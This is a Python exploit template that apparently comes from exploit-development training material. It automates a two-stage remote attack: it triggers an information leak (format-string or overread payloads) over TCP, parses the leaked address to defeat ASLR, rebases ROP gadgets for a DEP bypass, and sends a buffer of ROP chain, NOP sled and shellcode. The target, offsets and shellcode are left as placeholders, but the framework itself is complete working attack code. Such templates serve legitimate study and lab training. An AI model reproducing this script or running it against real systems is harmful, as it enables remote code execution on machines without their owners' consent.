#!/usr/bin/env python3
"""ASLR bypass via info leak -- two-stage exploit.

Stage 1: Send a payload that causes the target to leak an address
         (e.g., a format string %p, or an oversized read that includes
         a pointer on the stack/heap).
Stage 2: Parse the leaked address, compute the module base, rebase
         all gadget offsets, build the final exploit payload.

This template handles both stages in one script. Adjust the leak
parsing for your target's output format.

Run on Kali:
  python3 aslr_leak.py
"""
import re
import socket
import struct
import sys

# ============================================================
# FILL THESE IN
# ============================================================
MODE = "leak"           # leak | exploit | both

TARGET_HOST = "192.168.x.x"
TARGET_PORT = 9999
PROTOCOL    = "tcp"

PREFIX = b""
SUFFIX = b""

OFFSET = 0
BADCHARS = [0x00]

# --- Stage 1: Leak ---
# The payload that triggers the info leak.
# Examples:
#   Format string:  b"AAAA" + b"%08x." * 20
#   Overread:       b"A" * 5000
LEAK_PAYLOAD = b""

# How to find the leaked address in the response.
# Set LEAK_REGEX to a pattern that captures the hex address.
# Or set LEAK_OFFSET to extract raw bytes at a fixed position.
LEAK_REGEX  = r"([0-9a-fA-F]{8})"   # first 8-hex-digit match
LEAK_INDEX  = 0                       # which regex match (0 = first)
LEAK_OFFSET = -1                      # byte offset in response (-1 = use regex)
LEAK_LENGTH = 4                       # bytes to read if using LEAK_OFFSET

# Known offset of the leaked address from the module base.
# leaked_address - MODULE_OFFSET = module base address.
MODULE_OFFSET = 0x0                   # e.g., 0x11a8 if the leak is .text+0x11a8

# --- Stage 2: Exploit ---
# Gadget offsets relative to the module base.
# These get rebased once the leak gives us the real base address.
# Example for a DEP bypass:
GADGET_OFFSETS = {
    # "name": offset_from_base,
    # "pop_eax":     0x1234,
    # "pop_ecx":     0x5678,
    # "virtualalloc": 0x9abc,
}

# ROP chain as a list of references.
# Each entry is either:
#   - a string key from GADGET_OFFSETS (rebased at runtime)
#   - an int (used as-is, for constants like 0x40, 0x1000, etc.)
ROP_TEMPLATE = [
    # "pop_eax",
    # "virtualalloc",
    # ...
]

ALIGN_AFTER_ROP = b""
NOP_SLED = 32

# Shellcode -- three options (tried in order):
#   1. SHELLCODE_ASM: Keystone assembly (requires keystone-engine)
#   2. SHELLCODE_FILE: path to shellcode.bin
#   3. SHELLCODE: raw bytes pasted inline
SHELLCODE_ASM = r"""
"""
SHELLCODE_FILE = ""
SHELLCODE = b""


# ============================================================
# TRANSPORT
# ============================================================
def tcp_exchange(data, recv_size=4096, timeout=5.0):
    payload = PREFIX + data + SUFFIX
    print(f"[*] Sending {len(payload)} bytes...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((TARGET_HOST, TARGET_PORT))
        # Uncomment if the target sends a banner:
        # banner = s.recv(1024)
        s.sendall(payload)
        try:
            resp = b""
            while True:
                chunk = s.recv(recv_size)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
    return resp


def send_final(data):
    payload = PREFIX + data + SUFFIX
    print(f"[*] Final payload: {len(payload)} bytes")

    if PROTOCOL == "file":
        with open("exploit_payload.bin", "wb") as f:
            f.write(payload)
        print("[+] Written to exploit_payload.bin")
        return

    if PROTOCOL == "tcp":
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5.0)
            s.connect((TARGET_HOST, TARGET_PORT))
            # banner = s.recv(1024)
            s.sendall(payload)
        return

    raise ValueError(f"Unknown protocol: {PROTOCOL}")


# ============================================================
# LEAK PARSING
# ============================================================
def extract_leak(response):
    if LEAK_OFFSET >= 0:
        raw = response[LEAK_OFFSET:LEAK_OFFSET + LEAK_LENGTH]
        if len(raw) < LEAK_LENGTH:
            print(f"[-] Response too short ({len(response)} bytes)")
            sys.exit(1)
        addr = struct.unpack("<I", raw)[0]
        print(f"[+] Leaked (raw bytes at offset {LEAK_OFFSET}): 0x{addr:08x}")
        return addr

    text = response.decode("latin-1")
    matches = re.findall(LEAK_REGEX, text)
    if not matches:
        print(f"[-] No address found in response ({len(response)} bytes)")
        print(f"    Response: {text[:200]}")
        sys.exit(1)

    if LEAK_INDEX >= len(matches):
        print(f"[-] Only {len(matches)} matches, wanted index {LEAK_INDEX}")
        sys.exit(1)

    addr = int(matches[LEAK_INDEX], 16)
    print(f"[+] Leaked address: 0x{addr:08x} (match {LEAK_INDEX}: {matches[LEAK_INDEX]})")
    return addr


def rebase_gadgets(base):
    resolved = {}
    for name, offset in GADGET_OFFSETS.items():
        resolved[name] = base + offset
        print(f"    {name}: 0x{resolved[name]:08x}")
    return resolved


def build_rop(gadgets):
    chain = bytearray()
    for entry in ROP_TEMPLATE:
        if isinstance(entry, str):
            if entry not in gadgets:
                print(f"[-] ROP_TEMPLATE references unknown gadget: {entry}")
                sys.exit(1)
            chain += struct.pack("<I", gadgets[entry])
        else:
            chain += struct.pack("<I", entry)
    return bytes(chain)


# ============================================================
# SHELLCODE ASSEMBLY (Keystone)
# ============================================================
def assemble_ks(asm_text):
    try:
        from keystone import Ks, KS_ARCH_X86, KS_MODE_32
    except ImportError:
        print("[-] keystone-engine not installed (pip install keystone-engine)")
        sys.exit(1)
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    cleaned = asm_text.replace("jmp short ", "jmp ")
    try:
        encoding, count = ks.asm(cleaned)
    except Exception as e:
        print(f"[-] Assembly failed: {e}")
        sys.exit(1)
    sc = bytes(encoding)
    print(f"[+] Assembled {count} instructions -> {len(sc)} bytes")
    return sc


def get_shellcode():
    asm = SHELLCODE_ASM.strip()
    if asm:
        return assemble_ks(asm)
    if SHELLCODE_FILE:
        with open(SHELLCODE_FILE, "rb") as f:
            sc = f.read()
        print(f"[+] Loaded {len(sc)} bytes from {SHELLCODE_FILE}")
        return sc
    if SHELLCODE:
        return SHELLCODE
    print("[-] No shellcode. Set SHELLCODE_ASM, SHELLCODE_FILE, or SHELLCODE.")
    sys.exit(1)


# ============================================================
# MODES
# ============================================================
def do_leak():
    if not LEAK_PAYLOAD:
        print("[-] Set LEAK_PAYLOAD first.")
        sys.exit(1)
    resp = tcp_exchange(LEAK_PAYLOAD)
    print(f"[*] Response: {len(resp)} bytes")
    addr = extract_leak(resp)
    base = addr - MODULE_OFFSET
    print(f"[+] Module base: 0x{base:08x}")
    return base

def do_exploit(base=None):
    if base is None:
        print("[*] Enter the module base address (from leak mode):")
        raw = input("    base = ").strip()
        base = int(raw, 16)

    print(f"[*] Module base: 0x{base:08x}")
    gadgets = rebase_gadgets(base)
    rop = build_rop(gadgets)

    sc = get_shellcode()

    print(f"[*] ROP chain: {len(rop)} bytes ({len(rop)//4} gadgets)")
    print(f"[*] Shellcode: {len(sc)} bytes")

    buf = b"A" * OFFSET
    buf += rop
    buf += ALIGN_AFTER_ROP
    buf += b"\x90" * NOP_SLED
    buf += sc
    send_final(buf)

def do_both():
    base = do_leak()
    print()
    input("[*] Press Enter to send exploit (set breakpoint first)...")
    print()
    do_exploit(base)


MODES = {
    "leak": do_leak,
    "exploit": do_exploit,
    "both": do_both,
}

if __name__ == "__main__":
    mode = MODE.lower()
    if mode not in MODES:
        print(f"[-] Unknown mode: {mode}")
        sys.exit(1)
    MODES[mode]()
